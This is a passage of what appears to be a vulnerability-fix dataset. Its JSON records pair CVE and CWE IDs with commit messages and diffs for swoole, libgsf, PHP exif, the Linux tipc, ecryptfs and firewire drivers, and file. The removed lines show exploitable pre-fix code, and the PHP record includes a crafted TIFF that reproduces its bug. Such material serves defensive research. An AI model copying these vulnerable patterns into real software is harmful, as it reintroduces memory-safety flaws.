(ss - 10));\n-        /* no break */\n+            /* no break */\n         case 6: *((int*) (dd - 6)) = *((int*) (ss - 6));\n-        /* no break */\n+            /* no break */\n         case 2: *((short*) (dd - 2)) = *((short*) (ss - 2));\n             break;\n         case 65: *((int*) (dd - 65)) = *((int*) (ss - 65));\n-        /* no break */\n+            /* no break */\n         case 61: *((int*) (dd - 61)) = *((int*) (ss - 61));\n-        /* no break */\n+            /* no break */\n         case 57: *((int*) (dd - 57)) = *((int*) (ss - 57));\n-        /* no break */\n+            /* no break */\n         case 53: *((int*) (dd - 53)) = *((int*) (ss - 53));\n-        /* no break */\n+            /* no break */\n         case 49: *((int*) (dd - 49)) = *((int*) (ss - 49));\n-        /* no break */\n+            /* no break */\n         case 45: *((int*) (dd - 45)) = *((int*) (ss - 45));\n-        /* no break */\n+            /* no break */\n         case 41: *((int*) (dd - 41)) = *((int*) (ss - 41));\n-        /* no break */\n+            /* no break */\n         case 37: *((int*) (dd - 37)) = *((int*) (ss - 37));\n-        /* no break */\n+            /* no break */\n         case 33: *((int*) (dd - 33)) = *((int*) (ss - 33));\n-        /* no break */\n+            /* no break */\n         case 29: *((int*) (dd - 29)) = *((int*) (ss - 29));\n-        /* no break */\n+            /* no break */\n         case 25: *((int*) (dd - 25)) = *((int*) (ss - 25));\n-        /* no break */\n+            /* no break */\n         case 21: *((int*) (dd - 21)) = *((int*) (ss - 21));\n-        /* no break */\n+            /* no break */\n         case 17: *((int*) (dd - 17)) = *((int*) (ss - 17));\n-        /* no break */\n+            /* no break */\n         case 13: *((int*) (dd - 13)) = *((int*) (ss - 13));\n-        /* no break */\n+            /* no break */\n         case 9: *((int*) (dd - 9)) = *((int*) (ss - 9));\n-        /* no break */\n+            /* no break */\n         case 5: *((int*) (dd - 5)) = *((int*) (ss - 5));\n-        /* no break */\n+            /* no break */\n         case 1: dd[-1] = ss[-1];\n             break;\n         case 0:\n@@ -648,6 +651,7 @@ static void* swoole_unserialize_arr(void *buffer, zval *zvalue, uint32_t nNumOfE\n     //Initialize zend array\n     zend_ulong h, nIndex, max_index = 0;\n     uint32_t size = cp_zend_hash_check_size(nNumOfElements);\n+    CHECK_STEP;\n     if (!size)\n     {\n         return NULL;\n@@ -727,6 +731,7 @@ static void* swoole_unserialize_arr(void *buffer, zval *zvalue, uint32_t nNumOfE\n                     key_len = *((size_t*) buffer);\n                     buffer += sizeof (size_t);\n                 }\n+                CHECK_STEP;\n                 p->key = zend_string_init((char*) buffer, key_len, 0);\n                 //           h = zend_inline_hash_func((char*) buffer, key_len);\n                 h = zend_inline_hash_func((char*) buffer, key_len);\n@@ -804,6 +809,7 @@ static void* swoole_unserialize_arr(void *buffer, zval *zvalue, uint32_t nNumOfE\n                     data_len = *((size_t*) buffer);\n                     buffer += sizeof (size_t);\n                 }\n+                CHECK_STEP;\n                 p->val.value.str = zend_string_init((char*) buffer, data_len, 0);\n                 buffer += data_len;\n             }\n@@ -832,6 +838,7 @@ static void* swoole_unserialize_arr(void *buffer, zval *zvalue, uint32_t nNumOfE\n \n     }\n     ht->nNextFreeElement = max_index;\n+    CHECK_STEP;\n \n     return buffer;\n \n@@ -995,7 +1002,7 @@ static void swoole_serialize_arr(seriaString *buffer, zend_array *zvalue)\n \n                 if (GC_IS_RECURSIVE(ht))\n                 {\n-                    ((SBucketType*) (buffer->buffer + p))->data_type = IS_NULL;//reset type null\n+                    ((SBucketType*) (buffer->buffer + p))->data_type = IS_NULL; //reset type null\n                     php_error_docref(NULL TSRMLS_CC, E_NOTICE, \"the array has cycle ref\");\n                 }\n                 else\n@@ -1077,6 +1084,7 @@ static CPINLINE void swoole_unserialize_raw(void *buffer, zval *zvalue)\n }\n \n #if 0\n+\n /*\n  * null\n  */\n@@ -1250,7 +1258,7 @@ static CPINLINE zend_class_entry* swoole_try_get_ce(zend_string *class_name)\n         zend_throw_exception_ex(NULL, 0, \"can not find class %s\", class_name->val TSRMLS_CC);\n         return NULL;\n     }\n-    \n+\n     zend_string *fname = swoole_string_init(ZEND_STRL(PG(unserialize_callback_func)));\n     Z_STR(user_func) = fname;\n     Z_TYPE_INFO(user_func) = IS_STRING_EX;\n@@ -1282,6 +1290,7 @@ static void* swoole_unserialize_object(void *buffer, zval *return_value, zend_uc\n     zval property;\n     uint32_t arr_num = 0;\n     size_t name_len = *((unsigned short*) buffer);\n+    CHECK_STEP;\n     if (!name_len)\n     {\n         php_error_docref(NULL TSRMLS_CC, E_NOTICE, \"illegal unserialize data\");\n@@ -1289,17 +1298,18 @@ static void* swoole_unserialize_object(void *buffer, zval *return_value, zend_uc\n     }\n     buffer += 2;\n     zend_string *class_name;\n-    if (flag == UNSERIALIZE_OBJECT_TO_STDCLASS) \n+    if (flag == UNSERIALIZE_OBJECT_TO_STDCLASS)\n     {\n         class_name = swoole_string_init(ZEND_STRL(\"StdClass\"));\n-    } \n-    else \n+    }\n+    else\n     {\n         class_name = swoole_string_init((char*) buffer, name_len);\n     }\n     buffer += name_len;\n     zend_class_entry *ce = swoole_try_get_ce(class_name);\n     swoole_string_release(class_name);\n+    CHECK_STEP;\n \n     if (!ce)\n     {\n@@ -1311,11 +1321,10 @@ static void* swoole_unserialize_object(void *buffer, zval *return_value, zend_uc\n \n     object_init_ex(return_value, ce);\n \n-    zval *data,*d;\n+    zval *data, *d;\n     zend_string *key;\n     zend_ulong index;\n \n-    \n     ZEND_HASH_FOREACH_KEY_VAL(Z_ARRVAL(property), index, key, data)\n     {\n         const char *prop_name, *tmp;\n@@ -1337,8 +1346,8 @@ static void* swoole_unserialize_object(void *buffer, zval *return_value, zend_uc\n                 zend_unmangle_property_name_ex(key, &tmp, &prop_name, &prop_len);\n                 zend_update_property(ce, return_value, prop_name, prop_len, data);\n             }\n-//            zend_hash_update(Z_OBJPROP_P(return_value),key,data);\n-//            zend_update_property(ce, return_value, ZSTR_VAL(key), ZSTR_LEN(key), data);\n+            //            zend_hash_update(Z_OBJPROP_P(return_value),key,data);\n+            //            zend_update_property(ce, return_value, ZSTR_VAL(key), ZSTR_LEN(key), data);\n         }\n         else\n         {\n@@ -1388,7 +1397,7 @@ static void* swoole_unserialize_object(void *buffer, zval *return_value, zend_uc\n         swoole_string_release(fname);\n         zval_ptr_dtor(&ret);\n     }\n-\n+    CHECK_STEP;\n     return buffer;\n \n }\n@@ -1486,6 +1495,7 @@ PHPAPI int php_swoole_unserialize(void *buffer, size_t len, zval *return_value,\n {\n     SBucketType type = *(SBucketType*) (buffer);\n     zend_uchar real_type = type.data_type;\n+    unseri_buffer_end = buffer + len;\n     buffer += sizeof (SBucketType);\n     switch (real_type)\n     {\n@@ -1511,8 +1521,8 @@ PHPAPI int php_swoole_unserialize(void *buffer, size_t len, zval *return_value,\n         {\n             if (swoole_seria_check_eof(buffer, len) < 0)\n             {\n-                  php_error_docref(NULL TSRMLS_CC, E_NOTICE, \"detect the error eof\");\n-                  return SW_FALSE;\n+                php_error_docref(NULL TSRMLS_CC, E_NOTICE, \"detect the error eof\");\n+                return SW_FALSE;\n             }\n             unser_start = buffer - sizeof (SBucketType);\n             uint32_t num = 0;\n@@ -1526,8 +1536,8 @@ PHPAPI int php_swoole_unserialize(void *buffer, size_t len, zval *return_value,\n         case IS_UNDEF:\n             if (swoole_seria_check_eof(buffer, len) < 0)\n             {\n-                  php_error_docref(NULL TSRMLS_CC, E_NOTICE, \"detect the error eof\");\n-                  return SW_FALSE;\n+                php_error_docref(NULL TSRMLS_CC, E_NOTICE, \"detect the error eof\");\n+                return SW_FALSE;\n             }\n             unser_start = buffer - sizeof (SBucketType);\n             if (!swoole_unserialize_object(buffer, return_value, type.data_len, object_args, flag))\n", "owner": "swoole", "repo": "swoole-src", "source": "cve"}
{"CVE_ID": "CVE-2016-9888", "CWE_ID": "476", "category": "security", "commit_id": "95a8351a75758cf10b3bf6abae0b6b461f90d9e5", "commit_message": "From 95a8351a75758cf10b3bf6abae0b6b461f90d9e5 Mon Sep 17 00:00:00 2001\nFrom: Morten Welinder <terra@gnome.org>\nDate: Fri, 2 Dec 2016 22:19:54 -0500\nSubject: [PATCH] tar: fix crash on broken tar file.\n\n---\n ChangeLog            | 7 +++++++\n NEWS                 | 3 +++\n gsf/gsf-infile-tar.c | 4 +++-\n 3 files changed, 13 insertions(+), 1 deletion(-)\n\n", "diff_code": "diff --git a/ChangeLog b/ChangeLog\nindex c891943c..18508ece 100644\n--- a/ChangeLog\n+++ b/ChangeLog\n@@ -1,3 +1,10 @@\n+2016-11-30  Morten Welinder  <terra@gnome.org>\n+\n+\t* gsf/gsf-infile-tar.c (tar_directory_for_file): Handle the case\n+\twhere what we expected to be a directory is a file.  (That implies\n+\ta corrupted tar file.)  Thanks to Behzad Najjarpour Jabbari,\n+\tSecunia Research at Flexera Software for discovering this.\n+\n 2016-08-20  Morten Welinder <terra@gnome.org>\n \n \t* configure.ac: Post-release bump.\ndiff --git a/NEWS b/NEWS\nindex 01cc67a9..cfc1e43a 100644\n--- a/NEWS\n+++ b/NEWS\n@@ -1,5 +1,8 @@\n libgsf 1.14.41\n \n+Morten:\n+\t* Fix corrupted-tar-file crash.\n+\n --------------------------------------------------------------------------\n libgsf 1.14.40\n \ndiff --git a/gsf/gsf-infile-tar.c b/gsf/gsf-infile-tar.c\nindex 271595da..17513fe6 100644\n--- a/gsf/gsf-infile-tar.c\n+++ b/gsf/gsf-infile-tar.c\n@@ -181,9 +181,11 @@ tar_directory_for_file (GsfInfileTar *dir, const char *name, gboolean last)\n \t\t\t\tgsf_infile_child_by_name (GSF_INFILE (dir),\n \t\t\t\t\t\t\t  dirname);\n \t\t\tif (subdir) {\n+\t\t\t\tdir = GSF_IS_INFILE_TAR (subdir)\n+\t\t\t\t\t? GSF_INFILE_TAR (subdir)\n+\t\t\t\t\t: dir;\n \t\t\t\t/* Undo the ref. */\n \t\t\t\tg_object_unref (subdir);\n-\t\t\t\tdir = GSF_INFILE_TAR (subdir);\n \t\t\t} else\n \t\t\t\tdir = tar_create_dir (dir, dirname);\n \t\t}\n", "owner": "GNOME", "repo": "libgsf", "source": "cve"}
{"CVE_ID": "CVE-2016-7128", "CWE_ID": "200", "category": "security", "commit_id": "6dbb1ee46b5f4725cc6519abf91e512a2a10dfed", "commit_message": "From 6dbb1ee46b5f4725cc6519abf91e512a2a10dfed Mon Sep 17 00:00:00 2001\nFrom: Stanislav Malyshev <stas@php.net>\nDate: Mon, 8 Aug 2016 00:49:34 -0700\nSubject: [PATCH] Fixed bug #72627: Memory Leakage In exif_process_IFD_in_TIFF\n\n---\n ext/exif/exif.c              |   5 ++-\n ext/exif/tests/bug72627.phpt |  71 +++++++++++++++++++++++++++++++++++\n ext/exif/tests/bug72627.tiff | Bin 0 -> 1250 bytes\n 3 files changed, 75 insertions(+), 1 deletion(-)\n create mode 100644 ext/exif/tests/bug72627.phpt\n create mode 100644 ext/exif/tests/bug72627.tiff\n\n", "diff_code": "diff --git a/ext/exif/exif.c b/ext/exif/exif.c\nindex f95de3a14f19..657a2cc1f26e 100644\n--- a/ext/exif/exif.c\n+++ b/ext/exif/exif.c\n@@ -3768,8 +3768,11 @@ static int exif_process_IFD_in_TIFF(image_info_type *ImageInfo, size_t dir_offse\n \t\t\t\t\t\tfgot = php_stream_read(ImageInfo->infile, ImageInfo->Thumbnail.data, ImageInfo->Thumbnail.size);\n \t\t\t\t\t\tif (fgot < ImageInfo->Thumbnail.size) {\n \t\t\t\t\t\t\tEXIF_ERRLOG_THUMBEOF(ImageInfo)\n+\t\t\t\t\t\t\tefree(ImageInfo->Thumbnail.data);\n+\t\t\t\t\t\t\tImageInfo->Thumbnail.data = NULL;\n+\t\t\t\t\t\t} else {\n+\t\t\t\t\t\t\texif_thumbnail_build(ImageInfo TSRMLS_CC);\n \t\t\t\t\t\t}\n-\t\t\t\t\t\texif_thumbnail_build(ImageInfo TSRMLS_CC);\n \t\t\t\t\t}\n #ifdef EXIF_DEBUG\n \t\t\t\t\texif_error_docref(NULL EXIFERR_CC, ImageInfo, E_NOTICE, \"Read next IFD (THUMBNAIL) done\");\ndiff --git a/ext/exif/tests/bug72627.phpt b/ext/exif/tests/bug72627.phpt\nnew file mode 100644\nindex 000000000000..bb6a1fae99a1\n--- /dev/null\n+++ b/ext/exif/tests/bug72627.phpt\n@@ -0,0 +1,71 @@\n+--TEST--\n+Bug #72627 (Memory Leakage In exif_process_IFD_in_TIFF)\n+--SKIPIF--\n+<?php if (!extension_loaded('exif')) print 'skip exif extension not available';?>\n+--FILE--\n+<?php\n+\t$exif = exif_read_data(__DIR__ . '/bug72627.tiff',0,0,true);\n+\tvar_dump($exif);\n+?>\n+--EXPECTF--\n+Warning: exif_read_data(%s): Thumbnail goes IFD boundary or end of file reached in %sbug72627.php on line %d\n+\n+Warning: exif_read_data(%s): Error in TIFF: filesize(x04E2) less than start of IFD dir(x829A0004) in %sbug72627.php on line %d\n+\n+Warning: exif_read_data(%s): Thumbnail goes IFD boundary or end of file reached in %sbug72627.php on line %d\n+array(11) {\n+  [\"FileName\"]=>\n+  string(13) \"bug72627.tiff\"\n+  [\"FileDateTime\"]=>\n+  int(%d)\n+  [\"FileSize\"]=>\n+  int(1250)\n+  [\"FileType\"]=>\n+  int(7)\n+  [\"MimeType\"]=>\n+  string(10) \"image/tiff\"\n+  [\"SectionsFound\"]=>\n+  string(30) \"ANY_TAG, IFD0, THUMBNAIL, EXIF\"\n+  [\"COMPUTED\"]=>\n+  array(10) {\n+    [\"html\"]=>\n+    string(24) \"width=\"128\" height=\"132\"\"\n+    [\"Height\"]=>\n+    int(132)\n+    [\"Width\"]=>\n+    int(128)\n+    [\"IsColor\"]=>\n+    int(0)\n+    [\"ByteOrderMotorola\"]=>\n+    int(0)\n+    [\"ApertureFNumber\"]=>\n+    string(5) \"f/1.0\"\n+    [\"Thumbnail.FileType\"]=>\n+    int(2)\n+    [\"Thumbnail.MimeType\"]=>\n+    string(10) \"image/jpeg\"\n+    [\"Thumbnail.Height\"]=>\n+    int(132)\n+    [\"Thumbnail.Width\"]=>\n+    int(128)\n+  }\n+  [\"XResolution\"]=>\n+  string(21) \"1414812756/1414812756\"\n+  [\"THUMBNAIL\"]=>\n+  array(5) {\n+    [\"ImageWidth\"]=>\n+    int(128)\n+    [\"ImageLength\"]=>\n+    int(132)\n+    [\"JPEGInterchangeFormat\"]=>\n+    int(1280)\n+    [\"JPEGInterchangeFormatLength\"]=>\n+    int(100)\n+    [\"THUMBNAIL\"]=>\n+    NULL\n+  }\n+  [\"ExposureTime\"]=>\n+  string(21) \"1414812756/1414812756\"\n+  [\"FNumber\"]=>\n+  string(21) \"1414812756/1414812756\"\n+}\ndiff --git a/ext/exif/tests/bug72627.tiff b/ext/exif/tests/bug72627.tiff\nnew file mode 100644\nindex 0000000000000000000000000000000000000000..229190a6041926d960856267a5285d887eda49b5\nGIT binary patch\nliteral 1250\nzcmebD)MDUZU|?WkkYZ$IU<9%lSQr>G+gZSDC9uq_CWwp>P-ZTa?E+*wKom1FgVi<w\nvd5lnY3y94GF@u2>XgZXg0u%><|2O{MVo39)0|*%fqaiRF0wXpA{@(-uY6E(R\n\nliteral 0\nHcmV?d00001\n\n", "owner": "php", "repo": "php-src", "source": "cve"}
{"CVE_ID": "CVE-2016-5243", "CWE_ID": "200", "category": "security", "commit_id": "5d2be1422e02ccd697ccfcd45c85b4a26e6178e2", "commit_message": "From 5d2be1422e02ccd697ccfcd45c85b4a26e6178e2 Mon Sep 17 00:00:00 2001\nFrom: Kangjie Lu <kangjielu@gmail.com>\nDate: Thu, 2 Jun 2016 04:04:56 -0400\nSubject: [PATCH] tipc: fix an infoleak in tipc_nl_compat_link_dump\n\nlink_info.str is a char array of size 60. Memory after the NULL\nbyte is not initialized. Sending the whole object out can cause\na leak.\n\nSigned-off-by: Kangjie Lu <kjlu@gatech.edu>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n net/tipc/netlink_compat.c | 3 ++-\n 1 file changed, 2 insertions(+), 1 deletion(-)\n\n", "diff_code": "diff --git a/net/tipc/netlink_compat.c b/net/tipc/netlink_compat.c\nindex f795b1dd0ccdf..3ad9fab1985f1 100644\n--- a/net/tipc/netlink_compat.c\n+++ b/net/tipc/netlink_compat.c\n@@ -604,7 +604,8 @@ static int tipc_nl_compat_link_dump(struct tipc_nl_compat_msg *msg,\n \n \tlink_info.dest = nla_get_flag(link[TIPC_NLA_LINK_DEST]);\n \tlink_info.up = htonl(nla_get_flag(link[TIPC_NLA_LINK_UP]));\n-\tstrcpy(link_info.str, nla_data(link[TIPC_NLA_LINK_NAME]));\n+\tnla_strlcpy(link_info.str, nla_data(link[TIPC_NLA_LINK_NAME]),\n+\t\t    TIPC_MAX_LINK_NAME);\n \n \treturn tipc_add_tlv(msg->rep, TIPC_TLV_LINK_INFO,\n \t\t\t    &link_info, sizeof(link_info));\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2014-2270", "CWE_ID": "119", "category": "security", "commit_id": "447558595a3650db2886cd2f416ad0beba965801", "commit_message": "From 447558595a3650db2886cd2f416ad0beba965801 Mon Sep 17 00:00:00 2001\nFrom: Christos Zoulas <christos@zoulas.com>\nDate: Wed, 8 Jan 2014 22:22:54 +0000\nSubject: [PATCH] PR/313: Aaron Reffett: Check properly for exceeding the\n offset.\n\n---\n src/softmagic.c | 35 ++++++++++++++++++-----------------\n 1 file changed, 18 insertions(+), 17 deletions(-)\n\n", "diff_code": "diff --git a/src/softmagic.c b/src/softmagic.c\nindex ec713649b..ac9c18bdc 100644\n--- a/src/softmagic.c\n+++ b/src/softmagic.c\n@@ -32,7 +32,7 @@\n #include \"file.h\"\n \n #ifndef\tlint\n-FILE_RCSID(\"@(#)$File: softmagic.c,v 1.170 2014/01/06 02:25:32 christos Exp $\")\n+FILE_RCSID(\"@(#)$File: softmagic.c,v 1.171 2014/01/08 22:02:06 christos Exp $\")\n #endif\t/* lint */\n \n #include \"magic.h\"\n@@ -71,6 +71,7 @@ private void cvt_16(union VALUETYPE *, const struct magic *);\n private void cvt_32(union VALUETYPE *, const struct magic *);\n private void cvt_64(union VALUETYPE *, const struct magic *);\n \n+#define OFFSET_OOB(n, o, i)\t((n) < (o) || (i) >= ((n) - (o)))\n /*\n  * softmagic - lookup one file in parsed, in-memory copy of database\n  * Passed the name and FILE * of one file to be typed.\n@@ -1223,7 +1224,7 @@ mget(struct magic_set *ms, const unsigned char *s, struct magic *m,\n \t\t}\n \t\tswitch (in_type = cvt_flip(m->in_type, flip)) {\n \t\tcase FILE_BYTE:\n-\t\t\tif (nbytes < offset || nbytes < (offset + 1))\n+\t\t\tif (OFFSET_OOB(nbytes, offset, 1))\n \t\t\t\treturn 0;\n \t\t\tif (off) {\n \t\t\t\tswitch (m->in_op & FILE_OPS_MASK) {\n@@ -1258,7 +1259,7 @@ mget(struct magic_set *ms, const unsigned char *s, struct magic *m,\n \t\t\t\toffset = ~offset;\n \t\t\tbreak;\n \t\tcase FILE_BESHORT:\n-\t\t\tif (nbytes < offset || nbytes < (offset + 2))\n+\t\t\tif (OFFSET_OOB(nbytes, offset, 2))\n \t\t\t\treturn 0;\n \t\t\tif (off) {\n \t\t\t\tswitch (m->in_op & FILE_OPS_MASK) {\n@@ -1310,7 +1311,7 @@ mget(struct magic_set *ms, const unsigned char *s, struct magic *m,\n \t\t\t\toffset = ~offset;\n \t\t\tbreak;\n \t\tcase FILE_LESHORT:\n-\t\t\tif (nbytes < offset || nbytes < (offset + 2))\n+\t\t\tif (OFFSET_OOB(nbytes, offset, 2))\n \t\t\t\treturn 0;\n \t\t\tif (off) {\n \t\t\t\tswitch (m->in_op & FILE_OPS_MASK) {\n@@ -1362,7 +1363,7 @@ mget(struct magic_set *ms, const unsigned char *s, struct magic *m,\n \t\t\t\toffset = ~offset;\n \t\t\tbreak;\n \t\tcase FILE_SHORT:\n-\t\t\tif (nbytes < offset || nbytes < (offset + 2))\n+\t\t\tif (OFFSET_OOB(nbytes, offset, 2))\n \t\t\t\treturn 0;\n \t\t\tif (off) {\n \t\t\t\tswitch (m->in_op & FILE_OPS_MASK) {\n@@ -1399,7 +1400,7 @@ mget(struct magic_set *ms, const unsigned char *s, struct magic *m,\n \t\t\tbreak;\n \t\tcase FILE_BELONG:\n \t\tcase FILE_BEID3:\n-\t\t\tif (nbytes < offset || nbytes < (offset + 4))\n+\t\t\tif (OFFSET_OOB(nbytes, offset, 4))\n \t\t\t\treturn 0;\n \t\t\tif (off) {\n \t\t\t\tswitch (m->in_op & FILE_OPS_MASK) {\n@@ -1470,7 +1471,7 @@ mget(struct magic_set *ms, const unsigned char *s, struct magic *m,\n \t\t\tbreak;\n \t\tcase FILE_LELONG:\n \t\tcase FILE_LEID3:\n-\t\t\tif (nbytes < offset || nbytes < (offset + 4))\n+\t\t\tif (OFFSET_OOB(nbytes, offset, 4))\n \t\t\t\treturn 0;\n \t\t\tif (off) {\n \t\t\t\tswitch (m->in_op & FILE_OPS_MASK) {\n@@ -1540,7 +1541,7 @@ mget(struct magic_set *ms, const unsigned char *s, struct magic *m,\n \t\t\t\toffset = ~offset;\n \t\t\tbreak;\n \t\tcase FILE_MELONG:\n-\t\t\tif (nbytes < offset || nbytes < (offset + 4))\n+\t\t\tif (OFFSET_OOB(nbytes, offset, 4))\n \t\t\t\treturn 0;\n \t\t\tif (off) {\n \t\t\t\tswitch (m->in_op & FILE_OPS_MASK) {\n@@ -1610,7 +1611,7 @@ mget(struct magic_set *ms, const unsigned char *s, struct magic *m,\n \t\t\t\toffset = ~offset;\n \t\t\tbreak;\n \t\tcase FILE_LONG:\n-\t\t\tif (nbytes < offset || nbytes < (offset + 4))\n+\t\t\tif (OFFSET_OOB(nbytes, offset, 4))\n \t\t\t\treturn 0;\n \t\t\tif (off) {\n \t\t\t\tswitch (m->in_op & FILE_OPS_MASK) {\n@@ -1687,14 +1688,14 @@ mget(struct magic_set *ms, const unsigned char *s, struct magic *m,\n \t/* Verify we have enough data to match magic type */\n \tswitch (m->type) {\n \tcase FILE_BYTE:\n-\t\tif (nbytes < (offset + 1)) /* should alway be true */\n+\t\tif (OFFSET_OOB(nbytes, offset, 1))\n \t\t\treturn 0;\n \t\tbreak;\n \n \tcase FILE_SHORT:\n \tcase FILE_BESHORT:\n \tcase FILE_LESHORT:\n-\t\tif (nbytes < (offset + 2))\n+\t\tif (OFFSET_OOB(nbytes, offset, 2))\n \t\t\treturn 0;\n \t\tbreak;\n \n@@ -1713,31 +1714,31 @@ mget(struct magic_set *ms, const unsigned char *s, struct magic *m,\n \tcase FILE_FLOAT:\n \tcase FILE_BEFLOAT:\n \tcase FILE_LEFLOAT:\n-\t\tif (nbytes < (offset + 4))\n+\t\tif (OFFSET_OOB(nbytes, offset, 4))\n \t\t\treturn 0;\n \t\tbreak;\n \n \tcase FILE_DOUBLE:\n \tcase FILE_BEDOUBLE:\n \tcase FILE_LEDOUBLE:\n-\t\tif (nbytes < (offset + 8))\n+\t\tif (OFFSET_OOB(nbytes, offset, 8))\n \t\t\treturn 0;\n \t\tbreak;\n \n \tcase FILE_STRING:\n \tcase FILE_PSTRING:\n \tcase FILE_SEARCH:\n-\t\tif (nbytes < (offset + m->vallen))\n+\t\tif (OFFSET_OOB(nbytes, offset, m->vallen))\n \t\t\treturn 0;\n \t\tbreak;\n \n \tcase FILE_REGEX:\n-\t\tif (nbytes < offset)\n+\t\tif (OFFSET_OOB(nbytes, offset, 0))\n \t\t\treturn 0;\n \t\tbreak;\n \n \tcase FILE_INDIRECT:\n-\t\tif (nbytes < offset)\n+\t\tif (OFFSET_OOB(nbytes, offset, 0))\n \t\t\treturn 0;\n \t\tsbuf = ms->o.buf;\n \t\tsoffset = ms->offset;\n@@ -1761,7 +1762,7 @@ mget(struct magic_set *ms, const unsigned char *s, struct magic *m,\n \t\treturn rv;\n \n \tcase FILE_USE:\n-\t\tif (nbytes < offset)\n+\t\tif (OFFSET_OOB(nbytes, offset, 0))\n \t\t\treturn 0;\n \t\tsbuf = m->value.s;\n \t\tif (*sbuf == '^') {\n", "owner": "file", "repo": "file", "source": "cve"}
{"CVE_ID": "CVE-2016-1583", "CWE_ID": "119", "category": "security", "commit_id": "2f36db71009304b3f0b95afacd8eba1f9f046b87", "commit_message": "From 2f36db71009304b3f0b95afacd8eba1f9f046b87 Mon Sep 17 00:00:00 2001\nFrom: Jann Horn <jannh@google.com>\nDate: Wed, 1 Jun 2016 11:55:06 +0200\nSubject: [PATCH] ecryptfs: forbid opening files without mmap handler\n\nThis prevents users from triggering a stack overflow through a recursive\ninvocation of pagefault handling that involves mapping procfs files into\nvirtual memory.\n\nSigned-off-by: Jann Horn <jannh@google.com>\nAcked-by: Tyler Hicks <tyhicks@canonical.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n fs/ecryptfs/kthread.c | 13 +++++++++++--\n 1 file changed, 11 insertions(+), 2 deletions(-)\n\n", "diff_code": "diff --git a/fs/ecryptfs/kthread.c b/fs/ecryptfs/kthread.c\nindex 866bb18efefea..e818f5ac7a269 100644\n--- a/fs/ecryptfs/kthread.c\n+++ b/fs/ecryptfs/kthread.c\n@@ -25,6 +25,7 @@\n #include <linux/slab.h>\n #include <linux/wait.h>\n #include <linux/mount.h>\n+#include <linux/file.h>\n #include \"ecryptfs_kernel.h\"\n \n struct ecryptfs_open_req {\n@@ -147,7 +148,7 @@ int ecryptfs_privileged_open(struct file **lower_file,\n \tflags |= IS_RDONLY(d_inode(lower_dentry)) ? O_RDONLY : O_RDWR;\n \t(*lower_file) = dentry_open(&req.path, flags, cred);\n \tif (!IS_ERR(*lower_file))\n-\t\tgoto out;\n+\t\tgoto have_file;\n \tif ((flags & O_ACCMODE) == O_RDONLY) {\n \t\trc = PTR_ERR((*lower_file));\n \t\tgoto out;\n@@ -165,8 +166,16 @@ int ecryptfs_privileged_open(struct file **lower_file,\n \tmutex_unlock(&ecryptfs_kthread_ctl.mux);\n \twake_up(&ecryptfs_kthread_ctl.wait);\n \twait_for_completion(&req.done);\n-\tif (IS_ERR(*lower_file))\n+\tif (IS_ERR(*lower_file)) {\n \t\trc = PTR_ERR(*lower_file);\n+\t\tgoto out;\n+\t}\n+have_file:\n+\tif ((*lower_file)->f_op->mmap == NULL) {\n+\t\tfput(*lower_file);\n+\t\t*lower_file = NULL;\n+\t\trc = -EMEDIUMTYPE;\n+\t}\n out:\n \treturn rc;\n }\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2016-8633", "CWE_ID": "119", "category": "security", "commit_id": "667121ace9dbafb368618dbabcf07901c962ddac", "commit_message": "From 667121ace9dbafb368618dbabcf07901c962ddac Mon Sep 17 00:00:00 2001\nFrom: Stefan Richter <stefanr@s5r6.in-berlin.de>\nDate: Sat, 29 Oct 2016 21:28:18 +0200\nSubject: firewire: net: guard against rx buffer overflows\n\nThe IP-over-1394 driver firewire-net lacked input validation when\nhandling incoming fragmented datagrams.  A maliciously formed fragment\nwith a respectively large datagram_offset would cause a memcpy past the\ndatagram buffer.\n\nSo, drop any packets carrying a fragment with offset + length larger\nthan datagram_size.\n\nIn addition, ensure that\n  - GASP header, unfragmented encapsulation header, or fragment\n    encapsulation header actually exists before we access it,\n  - the encapsulated datagram or fragment is of nonzero size.\n\nReported-by: Eyal Itkin <eyal.itkin@gmail.com>\nReviewed-by: Eyal Itkin <eyal.itkin@gmail.com>\nFixes: CVE 2016-8633\nCc: stable@vger.kernel.org\nSigned-off-by: Stefan Richter <stefanr@s5r6.in-berlin.de>\n---\n drivers/firewire/net.c | 51 ++++++++++++++++++++++++++++++++++----------------\n 1 file changed, 35 insertions(+), 16 deletions(-)\n\n", "diff_code": "diff --git a/drivers/firewire/net.c b/drivers/firewire/net.c\nindex 309311b1faae..cbaa8d776d83 100644\n--- a/drivers/firewire/net.c\n+++ b/drivers/firewire/net.c\n@@ -578,6 +578,9 @@ static int fwnet_incoming_packet(struct fwnet_device *dev, __be32 *buf, int len,\n \tint retval;\n \tu16 ether_type;\n \n+\tif (len <= RFC2374_UNFRAG_HDR_SIZE)\n+\t\treturn 0;\n+\n \thdr.w0 = be32_to_cpu(buf[0]);\n \tlf = fwnet_get_hdr_lf(&hdr);\n \tif (lf == RFC2374_HDR_UNFRAG) {\n@@ -602,7 +605,12 @@ static int fwnet_incoming_packet(struct fwnet_device *dev, __be32 *buf, int len,\n \t\treturn fwnet_finish_incoming_packet(net, skb, source_node_id,\n \t\t\t\t\t\t    is_broadcast, ether_type);\n \t}\n+\n \t/* A datagram fragment has been received, now the fun begins. */\n+\n+\tif (len <= RFC2374_FRAG_HDR_SIZE)\n+\t\treturn 0;\n+\n \thdr.w1 = ntohl(buf[1]);\n \tbuf += 2;\n \tlen -= RFC2374_FRAG_HDR_SIZE;\n@@ -616,6 +624,9 @@ static int fwnet_incoming_packet(struct fwnet_device *dev, __be32 *buf, int len,\n \tdatagram_label = fwnet_get_hdr_dgl(&hdr);\n \tdg_size = fwnet_get_hdr_dg_size(&hdr); /* ??? + 1 */\n \n+\tif (fg_off + len > dg_size)\n+\t\treturn 0;\n+\n \tspin_lock_irqsave(&dev->lock, flags);\n \n \tpeer = fwnet_peer_find_by_node_id(dev, source_node_id, generation);\n@@ -722,6 +733,22 @@ static void fwnet_receive_packet(struct fw_card *card, struct fw_request *r,\n \tfw_send_response(card, r, rcode);\n }\n \n+static int gasp_source_id(__be32 *p)\n+{\n+\treturn be32_to_cpu(p[0]) >> 16;\n+}\n+\n+static u32 gasp_specifier_id(__be32 *p)\n+{\n+\treturn (be32_to_cpu(p[0]) & 0xffff) << 8 |\n+\t       (be32_to_cpu(p[1]) & 0xff000000) >> 